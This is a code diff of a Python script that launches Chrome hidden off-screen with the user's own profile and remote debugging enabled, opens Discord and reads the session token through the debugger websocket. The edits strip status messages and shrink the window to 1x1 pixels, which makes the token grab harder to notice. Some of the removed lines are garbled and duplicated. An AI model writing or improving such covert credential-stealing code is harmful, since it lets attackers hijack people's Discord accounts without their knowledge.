@@ -9,20 +9,18 @@ def get_discord_token():
     chrome_path = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
     profile_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')
     
-    print("Opening Chrome silently...")
     proc = subprocess.Popen([
         chrome_path,
         '--remote-debugging-port=9222',
         f'--user-data-dir={profile_path}',
         '--profile-directory=Default',
-        '--headless=new',
         '--no-sandbox',
         '--disable-gpu',
-        '--window-position=-32000,-32000',  # Move off screen as fallback
+        '--window-position=-32000,-32000',
+        '--window-size=1,1',
         'https://discord.com/app'
     ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     
-    print("Waiting for Discord to load...")
     time.sleep(10)
     
     try:
@@ -38,7 +36,6 @@ def get_discord_token():
             discord_tab = tabs[0]
         
         ws_url = discord_tab['webSocketDebuggerUrl']
-        
         result = {}
         
         def on_message(ws, message):
@@ -76,9 +73,4 @@ if __name__ == '__main__':
         print(token)
         print("="*60)
     else:
-        print("Failed - headless might have blocked Discord.")
-        print("Try removing --headless=new line if this fails.")        print(token)
-        print("="*60)
-    else:
-        print("Failed - Discord likely blocked headless mode.")
-        print("Remove the --headless=new line and run again.")
+        print("Failed.")
